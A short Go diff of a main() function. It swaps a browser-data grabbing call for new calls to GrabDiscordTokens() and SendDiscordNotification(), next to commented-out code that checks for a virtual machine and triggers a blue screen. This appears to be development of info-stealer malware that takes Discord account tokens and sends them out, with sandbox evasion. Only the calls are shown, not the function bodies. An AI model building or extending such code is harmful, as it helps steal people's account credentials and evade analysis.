@@ -11,5 +11,8 @@ func main() {
 	//if isRunningInVM() {
 	//	triggerBSOD()
 	//}
-	grabBrowsersData()
+	//grabBrowsersData()
+
+	GrabDiscordTokens()
+	SendDiscordNotification()
 }
